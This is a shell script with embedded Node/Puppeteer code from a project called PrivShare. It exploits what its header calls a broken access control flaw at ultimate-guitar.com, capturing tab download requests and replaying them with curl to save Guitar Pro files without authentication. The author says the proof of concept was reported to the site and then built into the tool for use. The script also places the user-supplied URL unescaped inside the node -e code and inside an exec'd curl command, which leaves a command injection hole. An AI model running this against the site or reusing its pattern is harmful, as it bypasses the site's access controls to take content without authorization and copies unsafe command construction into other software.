#!/usr/bin/env sh
#     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::       .<- 100  OVERFLOW 120 ->
#     ::                                                                                  ::       .  
#     ::      _____     ______   ______     __  __     __   __     ______     ______      ::       .
#     ::     /\  __-.  /\__  _\ /\  == \   /\ \_\ \   /\ "-.\ \   /\  ___\   /\__  _\     ::       .
#     ::     \ \ \/\ \ \/_/\ \/ \ \  __<   \ \  __ \  \ \ \-.  \  \ \  __\   \/_/\ \/     ::       .
#     ::      \ \____-    \ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\\"\_\  \ \_____\    \ \_\     ::       .
#     ::       \/____/     \/_/   \/_/ /_/   \/_/\/_/   \/_/ \/_/   \/_____/     \/_/     ::       .
#     ::                                                                                  ::       .
#     :::::::::::::::::::::::::::::::: [ HTTPS://DTRH.NET ] ::::::::::::::::::::::::::::::::       .
#                                                                                                  .
#          :: PROJECT: . . . . . . . . . . . . . . . . . . . . . . . . . . PrivShare               .
#          :: VERSION: . . . . . . . . . . . . . . . . . . . . . . . . . . 0.4.0                   .
#          :: AUTHOR:  . . . . . . . . . . . . . . . . . . . . . . . . . . KBS                     .
#          :: CREATED: . . . . . . . . . . . . . . . . . . . . . . . . . . 2025-01-14              .
#          :: LAST MODIFIED: . . . . . . . . . . . . . . . . . . . . . . . 2025-02-26              .
#                                                                                                  .
# :: FILE: . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  UG-Downloader.sh         .
#                                                                                                  .
# :: DESCRIPTION: Broken Access Control @ ultimate-guitar dot com                                  .
#              ::  This script was written as a POC and submitted to ultimate-guitar dot com on
#              :: January 14, 2025. I have implemented this script into the project, which allows
#              :: bypassing the authentication law directly by means of redirecting an expected
#              :: guitar pro tab in the form of a binary stream. This has been tested, and this
#              :: script will save the guitar pro file, while the endpoint makes a database entry
# MORE INFO:
#   https://github.com/DTRHnet/Bug-Bounty-Disclosures/blob/main/%5Bdtrh.net%5D-vuln.01-ultimate-guitar.com.pdf
#

usage() {
  echo "Usage: $0 <URL>"
  exit 1
}

[ -z "$1" ] && usage

iURL="$1"
oName=$(echo "$iURL" | sed -E 's|https://tabs.ultimate-guitar.com/tab/||' | sed 's|/|_|g' | sed -E 's/_GP.*//')

oFile="${oName}.gpx"
echo  "Generated file name: $oFile"

echoHEIST() {
  echo -e "Listening for web requests directed towards \033[1m'tabs.ultimate-guitar.com/download/public/'\033[0m"

  node -e "
    const puppeteer = require('puppeteer');
    const { exec } = require('child_process');

    (async () => {
      const browser = await puppeteer.launch({
        headless: true,
        executablePath: '/opt/google/chrome/google-chrome',            
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
      });

      const page = await browser.newPage();

      await page.setRequestInterception(true);
      page.on('request', (request) => {
        const url = request.url();

        if (url.includes('tabs.ultimate-guitar.com/download/public/')) {
          console.log('Captured request: ' + url);

          const headers = Object.entries(request.headers())
            .map(([key, value]) => \`-H '\${key}: \${value}'\`)
            .join(' \\\n  ');

          const curlCommand = \`
            curl -s -k '\${url}' \\
              \${headers} \\
              --output ${oFile}
          \`;

          console.log('Executing curl command...');
          exec(curlCommand, (error, stdout, stderr) => {
            if (error) {
              console.error('Error:', error.message);
              return;
            }
            if (stderr) {
              console.error('Stderr:', stderr);
            }
            console.log('Download complete: ${oFile}');

          });
        }
        request.continue();
      });

      console.log('Navigating to ' + '${iURL}');
      await page.goto('${iURL}', { waitUntil: 'networkidle2' });

      console.log('Waiting for network activity...');

      await browser.close();
    })();
  "
}

echoHEIST 

# KBS <admin [at] dtrh [dot] net
# https://dtrh.net
# eof
